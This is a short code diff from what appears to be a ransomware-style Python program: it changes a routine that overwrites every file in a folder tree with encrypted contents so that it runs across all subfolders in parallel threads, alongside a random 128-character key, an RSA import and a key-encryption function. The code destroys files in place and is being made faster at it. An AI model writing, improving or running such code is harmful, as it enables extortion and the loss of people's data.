@@ -3,6 +3,7 @@ from encrypt_file import edFile
 import os, time, random, rsa, sys
 import tkinter as tk
 from tkinter import messagebox
+import concurrent.futures
 
 time.clock = time.time
 
@@ -13,14 +14,21 @@ randomKey = "".join(random.choices(alphabets, k = 128))
 ed = edFile(randomKey)
 
 def encrypt_folder(folder):
-	contents = os.listdir(folder)
-	for c in contents:
-		f = os.path.join(folder, c)
-		if os.path.isfile(f):
-			e = ed.encrypt(f)
-			open(f, "wb").write(bytes(e, encoding = "utf-8"))
-		else:
-			encrypt_folder(f)
+
+	def enc(folder):
+		contents = os.listdir(folder)
+		for c in contents:
+			f = os.path.join(folder, c)
+			if os.path.isfile(f):
+				e = ed.encrypt(f)
+				open(f, "wb").write(bytes(e, encoding = "utf-8"))
+			else:
+				pass
+
+	l_of_folders = [f[0] for f in os.walk(folder)]
+
+	with concurrent.futures.ThreadPoolExecutor() as executer:
+		executer.map(enc, l_of_folders)
 
 def encryptKey():
 	global randomKey
